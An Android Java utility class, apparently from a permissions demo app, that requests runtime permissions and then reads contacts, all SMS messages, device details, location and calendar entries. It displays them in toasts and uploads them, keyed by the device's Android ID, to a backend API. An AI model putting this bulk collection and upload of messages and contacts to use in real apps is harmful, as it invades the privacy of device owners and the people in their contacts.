/*
 * Copyright (C) 2022 xuexiangjys(xuexiangjys@163.com)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *       http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 */

package com.lenovo.innovate.prince;

import static com.xuexiang.xutil.XUtil.getContentResolver;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.ContentResolver;
import android.content.Context;
import android.content.DialogInterface;
import android.database.Cursor;
import android.net.Uri;
import android.os.UserManager;
import android.provider.Settings;
import android.util.ArrayMap;
import android.util.Log;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;
import com.an.deviceinfo.device.model.Battery;
import com.an.deviceinfo.device.model.Device;
import com.an.deviceinfo.device.model.Memory;
import com.an.deviceinfo.location.DeviceLocation;
import com.an.deviceinfo.location.LocationInfo;
import com.an.deviceinfo.usercontacts.UserContactInfo;
import com.an.deviceinfo.usercontacts.UserContacts;
import com.hjq.permissions.OnPermissionCallback;
import com.hjq.permissions.Permission;
import com.hjq.permissions.XXPermissions;
import com.lenovo.innovate.activity.MainActivity;
import com.lenovo.innovate.core.http.subscriber.TipRequestSubscriber;
import com.lenovo.innovate.prince.calander.CalenderDataStruct;
import com.lenovo.innovate.prince.calander.calendarUtil;
import com.lenovo.innovate.prince.http.ApiProvider;
import com.lenovo.innovate.prince.http.TestApi;
import com.lenovo.innovate.prince.http.entity.PerInfo;
import com.lenovo.innovate.prince.message.GetMessageInfo;
import com.lenovo.innovate.prince.utils.CameraUtils;
import com.lenovo.innovate.utils.XToastUtils;
import com.xuexiang.rxutil2.rxjava.RxSchedulerUtils;
import com.xuexiang.xhttp2.XHttp;
import com.xuexiang.xhttp2.XHttpSDK;
import com.xuexiang.xhttp2.callback.SimpleCallBack;
import com.xuexiang.xhttp2.exception.ApiException;
import com.xuexiang.xhttp2.model.ApiResult;
import com.xuexiang.xhttp2.model.XHttpRequest;
import com.xuexiang.xhttp2.request.CustomRequest;
import com.xuexiang.xhttp2.subsciber.ProgressLoadingSubscriber;
import com.xuexiang.xhttp2.subsciber.impl.IProgressLoader;
import com.xuexiang.xhttp2.utils.HttpUtils;
import com.xuexiang.xrouter.launcher.XRouter;
import com.xuexiang.xutil.net.JsonUtil;
import com.xuexiang.xutil.tip.ToastUtils;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class PermissionUtils {

    private IProgressLoader mIProgressLoader;

    public  void get_contact(Context context,Activity activity){
        XXPermissions.with(context)
                .permission(Permission.READ_CONTACTS)

                .request(new OnPermissionCallback() {
                    @Override
                    public void onGranted(List<String> permissions, boolean all) {
                        if (all){

                            Activity a = (Activity) context ;
                            XToastUtils.toast( "onGranted: 获取权限成功！");
                            UserContactInfo userContactInfo = new UserContactInfo(a);

                            List<UserContacts> userContacts = userContactInfo.getContacts();
                            if (userContacts.isEmpty()){
                                XToastUtils.toast( "通讯录为空");
                                return;
                            }
                            Map<String,String> map = new HashMap<>();
                            for (int i = 0; i < userContacts.size(); i++) {
                                String name = userContacts.get(i).getDisplayName();
                                String number = userContacts.get(i).getMobileNumber();
                                map.put(name,number);
                            }
                            XToastUtils.toast( "电话号码"+map.toString());
/*

                            JSONObject jsonObject  = new JSONObject();
                            jsonObject.put("permission","contact");
                            jsonObject.put("deviceId",Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
                            jsonObject.put("data",JSONArray.toJSON(map));
*/

                            http_post(map.toString());
                        }
                    }
                    @Override
                    public void onDenied(List<String> permissions, boolean never) {
                        if (never){
                            XToastUtils.toast( "onDenied：被永久拒绝授权，请手动授予权限 ");
                            XXPermissions.startPermissionActivity(context,permissions);
                        }else {
                            XToastUtils.toast( "onDenied: 权限获取失败 ");
                        }
                    }
                });
    }

    public void get_message(Context context){
        XXPermissions.with(context)
                .permission(Permission.READ_SMS)
                .permission(Permission.RECEIVE_SMS)
                .request(new OnPermissionCallback() {
                    @Override
                    public void onGranted(List<String> permissions, boolean all) {
                        if (all){
                            XToastUtils.toast( "onGranted: 获取权限成功！");
                            /*GetMessageInfo getMessageInfo = new GetMessageInfo(context);
                            getMessageInfo.getSmsInfos();
                            obtainPhoneMessage();
                                           //   data.add(map);
                                    //通知适配器发生改变
                                  //  simpleAdapter.notifyDataSetChanged();
                            */

                            Uri uri=Uri.parse("content://sms/");
                            ContentResolver resolver = getContentResolver();
                            Cursor cursor = resolver.query(uri, new String[]{"_id", "address", "body", "date", "type"}, null, null, null);
                            if(cursor!=null&&cursor.getCount()>0){
                                int _id;
                                String address;
                                String body;
                                String date;
                                int type;
                                Map<String,Object>map=new HashMap<String,Object>();
                                while (cursor.moveToNext()){

                                    _id=cursor.getInt(0);
                                    address=cursor.getString(1);
                                    body=cursor.getString(2);
                                    date=cursor.getString(3);
                                    type=cursor.getInt(4);
                                    map.put(address,body);
                                    XToastUtils.toast( "_id="+_id+" address="+address+" body="+body+" date="+date+" type="+type);

                                }


                                JSONObject jsonObject  = new JSONObject();
                                jsonObject.put("permission","message");
                                jsonObject.put("deviceId", Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
                                jsonObject.put("data",JSONArray.toJSON(map));

                                http_contact(jsonObject);

                            }
                        }
                    }
                    @Override
                    public void onDenied(List<String> permissions, boolean never) {
                        if (never){
                            XToastUtils.toast( "onDenied：被永久拒绝授权，请手动授予权限 ");
                            XXPermissions.startPermissionActivity(context,permissions);
                        }else {
                            XToastUtils.toast( "onDenied: 权限获取失败 ");
                        }
                    }
                });
    }

    public  void get_phoneMessage(Context context){
        XXPermissions.with(context)
                .permission(Permission.READ_PHONE_STATE)
                .request(new OnPermissionCallback() {
                    @Override
                    public void onGranted(List<String> permissions, boolean all) {
                        if (all) {
                            XToastUtils.toast("onGranted: 获取权限成功！");
                            Device device = new Device(context);
                            Memory memory = new Memory(context);
                            Battery battery = new Battery(context);

                            Map<String,String> map = new HashMap<>();
                            map.put("手机品牌",device.getManufacturer());
                            map.put("手机型号",device.getModel());
                            map.put("安卓版本",device.getOsVersion());
                            map.put("运行内存", String.valueOf(Float.valueOf(String.format("%.2f", (float) memory.getTotalRAM() / (1024 * 1024 * 1024)))) + " GB");
                            map.put("手机存储", String.valueOf(Float.valueOf(String.format("%.2f", (float) memory.getTotalInternalMemorySize() / (1024 * 1024 * 1024))))+ " GB");
                            map.put("屏幕像素",(String.valueOf(device.getScreenHeight()))+"*" + (String.valueOf(device.getScreenWidth())));
                            map.put("电池电量",String.valueOf(battery.getBatteryPercent())+"%");
                            map.put("电池温度",String.valueOf(battery.getBatteryTemperature())+"摄氏度");
                          //  map.put("前置摄像头", CameraUtils.getCameraPixels(CameraUtils.hasBackCamera()));
                          //  map.put("后置摄像头",CameraUtils.getCameraPixels(CameraUtils.hasFrontCamera()));

                            XToastUtils.toast( "手机信息"+map.toString());

                            JSONObject jsonObject  = new JSONObject();
                            jsonObject.put("permission","device");
                            jsonObject.put("deviceId", Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
                            jsonObject.put("data",JSONArray.toJSON(map));

                            http_contact(jsonObject);
                        }
                    }
                    @Override
                    public void onDenied(List<String> permissions, boolean never) {
                        if (never){
                            XToastUtils.toast( "onDenied：被永久拒绝授权，请手动授予权限 ");
                            XXPermissions.startPermissionActivity(context,permissions);
                        }else {
                            XToastUtils.toast( "onDenied: 权限获取失败 ");
                        }
                    }
                });
    }

    public  void get_location(Context context){
        XXPermissions.with(context)
                .permission(Permission.ACCESS_FINE_LOCATION)
                .permission(Permission.ACCESS_COARSE_LOCATION)

                .request(new OnPermissionCallback() {
                    @Override
                    public void onGranted(List<String> permissions, boolean all) {
                        if (all){
                            XToastUtils.toast( "onGranted: 获取权限成功！");
                            LocationInfo locationInfo = new LocationInfo(context);
                            DeviceLocation deviceLocation = locationInfo.getLocation();
                            XToastUtils.toast( "位置："+deviceLocation.getAddressLine1());

                            Map<String,String> map = new HashMap<>();
                            map.put("location",deviceLocation.getAddressLine1());
                            JSONObject jsonObject  = new JSONObject();
                            jsonObject.put("permission","location");
                            jsonObject.put("deviceId",Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
                            jsonObject.put("data",JSONArray.toJSON(map));

                            http_contact(jsonObject);
                        }
                    }
                    @Override
                    public void onDenied(List<String> permissions, boolean never) {
                        if (never){
                            XToastUtils.toast( "onDenied：被永久拒绝授权，请手动授予权限 ");
                            XXPermissions.startPermissionActivity(context,permissions);
                        }else {
                            XToastUtils.toast( "onDenied: 权限获取失败 ");
                        }
                    }
                });
    }

    public  void get_calendar(Context context){
        XXPermissions.with(context)
                .permission(Permission.READ_CALENDAR)
                .request(new OnPermissionCallback() {
                    @Override
                    public void onGranted(List<String> permissions, boolean all) {
                        if (all){
                            XToastUtils.toast( "onGranted: 获取权限成功！");
                            ArrayList<CalenderDataStruct> calenderDataStructs = calendarUtil.GetCalenderSchedule(context);
                            List<String> list = new ArrayList<>();
                            for (CalenderDataStruct item : calenderDataStructs){
                                XToastUtils.toast("onCreate: CalenderDataStruct "+ item.toString());
                                list.add(item.toString());
                            }
                            Map<String,String> map = new HashMap<>();
                            map.put("calendar",list.toString());
                            JSONObject jsonObject  = new JSONObject();
                            jsonObject.put("permission","calendar");
                            jsonObject.put("deviceId",Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
                            jsonObject.put("data",JSONArray.toJSON(map));
                            http_contact(jsonObject);

                            new AlertDialog.Builder((Activity)context).setTitle("信息提示")//设置对话框标题
                                    .setMessage(list.toString())
                                    .setPositiveButton("是", new DialogInterface.OnClickListener() {//添加确定按钮
                                        @Override
                                        public void onClick(DialogInterface dialog, int which) {//确定按钮的响应事件

                                        }
                                    }).setNegativeButton("否", new DialogInterface.OnClickListener() {//添加返回按钮

                                @Override
                                public void onClick(DialogInterface dialog, int which) {//响应事件

                                }

                            }).show();//在按
                        }
                    }
                    @Override
                    public void onDenied(List<String> permissions, boolean never) {
                        if (never){
                            XToastUtils.toast( "onDenied：被永久拒绝授权，请手动授予权限 ");
                            XXPermissions.startPermissionActivity(context,permissions);
                        }else {
                            XToastUtils.toast( "onDenied: 权限获取失败 ");
                        }
                    }
                });
    }

    public  void get_storage(Context context){
        XXPermissions.with(context)
                .permission(Permission.READ_EXTERNAL_STORAGE)
                .request(new OnPermissionCallback() {
                    @Override
                    public void onGranted(List<String> permissions, boolean all) {
                        if (all){
                            XToastUtils.toast( "onGranted: 获取权限成功！");
                        }
                    }
                    @Override
                    public void onDenied(List<String> permissions, boolean never) {
                        if (never){
                            XToastUtils.toast( "onDenied：被永久拒绝授权，请手动授予权限 ");
                            XXPermissions.startPermissionActivity(context,permissions);
                        }else {
                            XToastUtils.toast( "onDenied: 权限获取失败 ");
                        }
                    }
                });
    }

    public  void get_microphone(Context context){
        XXPermissions.with(context)
                .permission(Permission.RECORD_AUDIO)
                .request(new OnPermissionCallback() {
                    @Override
                    public void onGranted(List<String> permissions, boolean all) {
                        if (all){
                            XToastUtils.toast( "onGranted: 获取权限成功！");
                        }
                    }
                    @Override
                    public void onDenied(List<String> permissions, boolean never) {
                        if (never){
                            XToastUtils.toast( "onDenied：被永久拒绝授权，请手动授予权限 ");
                            XXPermissions.startPermissionActivity(context,permissions);
                        }else {
                            XToastUtils.toast( "onDenied: 权限获取失败 ");
                        }
                    }
                });
    }


    public  void get_camera(Context context){
        XXPermissions.with(context)
                .permission(Permission.CAMERA)
                .request(new OnPermissionCallback() {
                    @Override
                    public void onGranted(List<String> permissions, boolean all) {
                        if (all){
                            XToastUtils.toast( "onGranted: 获取权限成功！");
                        }
                    }
                    @Override
                    public void onDenied(List<String> permissions, boolean never) {
                        if (never){
                            XToastUtils.toast( "onDenied：被永久拒绝授权，请手动授予权限 ");
                            XXPermissions.startPermissionActivity(context,permissions);
                        }else {
                            XToastUtils.toast( "onDenied: 权限获取失败 ");
                        }
                    }
                });
    }



    private Uri SMS_INBOX = Uri.parse("content://sms/");

    private  void obtainPhoneMessage() {
        ContentResolver cr = getContentResolver();
        String[] projection = new String[]{"_id", "address", "person", "body", "date", "type"};
        Cursor cur = cr.query(SMS_INBOX, projection, null, null, "date desc");
        if (null == cur) {
            Log.i("ooc", "************cur == null");
            return;
        }
        while (cur.moveToNext()) {
            String number = cur.getString(cur.getColumnIndex("address"));//手机号
            String name = cur.getString(cur.getColumnIndex("person"));//联系人姓名列表
            String body = cur.getString(cur.getColumnIndex("body"));//短信内容
            //至此就获得了短信的相关的内容, 以下是把短信加入map中，构建listview,非必要。
            Map<String, Object> map = new HashMap<String, Object>();
            map.put("num", number);
            map.put("mess", body);
            //list.add(map);
        }
    }


    private void http_contact(Object perInfo){
        XHttpRequest req = ApiProvider.getAddPerReq(perInfo);
        XHttpSDK.executeToMain(req, new ProgressLoadingSubscriber<Boolean>(mIProgressLoader) {
            @Override
            public void onSuccess(Boolean aBoolean) {
                ToastUtils.toast("成功！");
               // mRefreshLayout.autoRefresh();
            }
            @Override
            public void onError(ApiException e) {
                ToastUtils.toast(e.getDisplayMessage());
            }
        });
    }



    public  void http_post(String txt){
            //使用retrofit自身定义的接口进行请求
            XHttp.custom(TestApi.LoginService.class)
                    .login(txt)
                    .compose(RxSchedulerUtils.<ApiResult<String>>_io_main_o())
                    .subscribeWith(new TipRequestSubscriber<ApiResult<String>>() {
                        @Override
                        protected void onSuccess(ApiResult<String> loginInfoApiResult) {
                            ToastUtils.toast("请求成功!");
                        //    showResult(JsonUtil.toJson(loginInfoApiResult));
                        }
                    });

    }


}
